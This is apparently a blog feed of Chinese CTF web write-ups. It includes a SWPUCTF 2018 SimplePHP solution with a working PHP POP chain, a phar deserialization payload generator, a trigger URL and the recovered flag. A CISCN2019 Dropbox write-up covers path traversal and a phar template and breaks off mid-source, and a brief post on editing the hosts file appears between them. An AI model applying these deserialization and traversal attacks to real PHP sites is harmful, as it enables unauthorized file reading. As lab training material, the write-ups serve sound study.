class="line">&lt;title&gt;Real_Flag In Here!!!&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;咦，你居然找到我了？！不过看到这句话也不代表你就能拿到flag哦！&quot;;</span><br><span class="line">$f4ke_flag = &quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;;</span><br><span class="line">$rea1_f1114g = &quot;flag&#123;d6dc84d3-690e-44ab-b3e2-a03940959b5d&#125;&quot;;</span><br><span class="line">unset($rea1_f1114g);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> php代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF_2018-SimplePHP</title>
      <link href="/2020/10/23/SWPUCTF-2018-SimplePHP/"/>
      <url>/2020/10/23/SWPUCTF-2018-SimplePHP/</url>
      
        <content type="html"><![CDATA[<h2 id="拿下代码"><a href="#拿下代码" class="headerlink" title="拿下代码"></a>拿下代码</h2><p>先通过查看文件的功能拿下全部的文件代码，分别是<code>index.php</code>、<code>base.php</code>、<code>file.php</code>、<code>upload_file.php</code>、<code>function.php</code>、<code>class.php</code>。然后粗略看下代码，有个提示（不知道是不是后面放上去的），就是<code>class.php</code>那里。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><h2 id="审计与pop链的构造"><a href="#审计与pop链的构造" class="headerlink" title="审计与pop链的构造"></a>审计与pop链的构造</h2><p>首先是<code>C1e4r</code>类的<code>__destruct()</code>方法，可以把<code>$test</code>也就是<code>$str</code>给输出出来。想要输出flag就得将<code>$str</code>的内容为flag文件，将<code>$str</code>声明为<code>$show</code>对象可以触发<code>show</code>类中的<code>__toString()</code>方法。</p><p>然后是<code>show</code>类的<code>__toString()</code>方法，可以把<code>$content</code>的内容返回对象，这就要求<code>$show-&gt;str[&#39;str&#39;]-&gt;source</code>的内容为flag文件，若<code>$show-&gt;str[&#39;str&#39;]</code>为test类的一个实例化对象，则因<code>test</code>类里面没有<code>source</code>属性，从而触发<code>__get()</code>方法。</p><p>最后就是<code>test</code>类了，利用<code>__get()</code>到<code>get()</code>到<code>file_get($value)</code>到最后返回出来，$value的值为<code>$this-&gt;params[$key]</code>，</p><p>下为pop链函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c1e4r = new C1e4r();</span><br><span class="line">$show = new Show();</span><br><span class="line">$test = new Test();</span><br><span class="line"></span><br><span class="line">$test-&gt;params[&#x27;source&#x27;] = &quot;/var/www/html/f1ag.php&quot;;  //目标文件</span><br><span class="line">$c1e4r-&gt;str = $show;   //触发__toString()，利用 `$this-&gt;test = $this-&gt;str; echo $this-&gt;test;`</span><br><span class="line">$show-&gt;str[&#x27;str&#x27;] = $test;  //触发__get()，利用 `$this-&gt;str[&#x27;str&#x27;]-&gt;source`;</span><br></pre></td></tr></table></figure><p>第一个<code>__tostring()</code>的触发是因为对象被当做字符串了，第二个<code>__get()</code>方法触发是因为<code>test</code>类里面没有<code>source</code>属性。</p><h2 id="phar文件制作及利用"><a href="#phar文件制作及利用" class="headerlink" title="phar文件制作及利用"></a>phar文件制作及利用</h2><p>phar文件制作脚本:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c1e4r = new C1e4r();</span><br><span class="line">$show = new Show();</span><br><span class="line">$test = new Test();</span><br><span class="line"></span><br><span class="line">$test-&gt;params[&#x27;source&#x27;] = &quot;/var/www/html/f1ag.php&quot;;  //目标文件</span><br><span class="line">$c1e4r-&gt;str = $show;   //触发__toString()，利用 `$this-&gt;test = $this-&gt;str; echo $this-&gt;test;`</span><br><span class="line">$show-&gt;str[&#x27;str&#x27;] = $test;  //触发__get()，利用 `$this-&gt;str[&#x27;str&#x27;]-&gt;source`;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;7.phar&quot;); //生成phar文件</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;);</span><br><span class="line">$phar-&gt;setMetadata($c1e4r); //触发头是C1e4r类</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //生成签名</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>本地访问一下生成文件后改下后缀名为<code>.png</code>，上传。上传之后可以在<code>upload</code>目录下发现刚上传的图片，在<code>function.php</code>的源码里面可以发现下面的这条语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(file_exists(&quot;upload/&quot; . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>从而得知文件的目录。。。阿巴阿巴，目录直接就开着呢，就比较好找。</p><h2 id="触发phar-x2F-x2F-获得flag"><a href="#触发phar-x2F-x2F-获得flag" class="headerlink" title="触发phar:&#x2F;&#x2F;获得flag"></a>触发phar:&#x2F;&#x2F;获得flag</h2><p>访问格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b96da071-0c04-4abe-96c6-ea5cf235782d.node3.buuoj.cn/file.php?file=phar://upload/2fe9104ed353a3e60ed55404e1abf179.jpg</span><br></pre></td></tr></table></figure><p><img src="/2020/10/23/SWPUCTF-2018-SimplePHP//1.png"><br>获得base64转化后的内容解码一下即为flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> <span class="title function_ invoke__">__HALT_COMPILER</span>(); <span class="meta">?&gt;</span></span><br><span class="line">PD9waHAgDQoJLy8kYSA9ICdmbGFnezBlNjg3NzQzLWM5NWQtNDJhMi04Nzk5LWM0MzIwNjU1MjBjMH0nOw0KID8+DQoNCg==</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//$a = &#x27;flag&#123;0e687743-c95d-42a2-8799-c432065520c0&#125;&#x27;;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> phar反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决访问不了github的问题</title>
      <link href="/2020/10/23/%E8%A7%A3%E5%86%B3%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86github%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2020/10/23/%E8%A7%A3%E5%86%B3%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86github%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>在又一次访问不了github之后，我终于想起来了修一下电脑的某些文件。百度到了问题的解决方案如下<a href="https://blog.csdn.net/whbk101/article/details/102703671">链接</a>所示.</p><h2 id="二次总结"><a href="#二次总结" class="headerlink" title="二次总结"></a>二次总结</h2><p>为防止意外，二次总结一下</p><h3 id="改host文件内容"><a href="#改host文件内容" class="headerlink" title="改host文件内容"></a>改host文件内容</h3><p>是<code>C:\Windows\System32\Drivers\etc</code>目录下的<code>host</code>文件需要修改。原来可能是空的（反正我原来是空的），直接改为以下格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#github</span><br><span class="line">192.30.253.112 github.com </span><br><span class="line"> </span><br><span class="line">151.101.113.194 github.global.ssl.fastly.net</span><br></pre></td></tr></table></figure><p>然后上面的两个ip地址分别为<br><a href="http://github.com.ipaddress.com/">http://github.com.ipaddress.com/</a></p><p><a href="http://github.global.ssl.fastly.net.ipaddress.com/">http://github.global.ssl.fastly.net.ipaddress.com/</a></p><p>然后就可以正常访问了!<br><img src="/2020/10/23/%E8%A7%A3%E5%86%B3%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86github%E7%9A%84%E9%97%AE%E9%A2%98//1.png" alt="1.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 电脑问题 </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019_华北赛区_Day1_Web1-Dropbox</title>
      <link href="/2020/10/22/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-1/"/>
      <url>/2020/10/22/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-1/</url>
      
        <content type="html"><![CDATA[<h2 id="好长时间没做web了，web狗太难了"><a href="#好长时间没做web了，web狗太难了" class="headerlink" title="好长时间没做web了，web狗太难了"></a>好长时间没做web了，web狗太难了</h2><p>首先得检讨一下，我竟然将近三天没做web题目了，这这这还是一个web狗应该做的吗？反思一下呜呜呜。。。</p><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>什么是phar反序列化呢？</p><p>下面的文章可能会有点帮助<a href="https://www.jianshu.com/p/0cfc98f72e52">来自jianshu</a></p><p>按照我的理解来说呢，就是把危险的文件上传到服务器？然后借助某些功能与危险函数实现危险的操作，太笼统了。具体来说呢就是php文件系统中<code>很大一部分的函数</code>在通过<code>phar://</code>解析时，存在着对<code>meta-data</code>（在这里<code>&lt;meta-data&gt;区域</code>面搞反序列化的pop链）反序列化的操作。</p><h2 id="具体实现的实例如下所示"><a href="#具体实现的实例如下所示" class="headerlink" title="具体实现的实例如下所示"></a>具体实现的实例如下所示</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**上面的这里写pop链*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**下面的东西一般是不变的*/</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;7.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php__HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$exception</span>);   <span class="comment">//set-metadata参数会变</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="回归正题，题解如下"><a href="#回归正题，题解如下" class="headerlink" title="回归正题，题解如下"></a>回归正题，题解如下</h2><p>下午好，web狗。<br>终于清理掉这个老顽固了。<img src="/2020/10/22/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-1//1.png" alt="哈哈"></p><p>先分析源代码找出pop链，代码怎么找？</p><h2 id="0x01-任意文件下载"><a href="#0x01-任意文件下载" class="headerlink" title="0x01 任意文件下载"></a>0x01 任意文件下载</h2><p>注册登录后，有个上传文件的地方，上传过图片后可以删除或者下载，然后就想着可能是文件上传漏洞，开始我还以为要上传图片马。。</p><p>这里的这个任意文件下载-&gt;先用burp抓包，修改其中的filename字段就可以了，改为..&#x2F;..&#x2F;index.php下载主页代码。其他代码类似也能下载，这信息收集真的难顶，收集能收集10分钟，我丢。</p><p>利用的类都在class.php文件里面，下面是class文件的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span 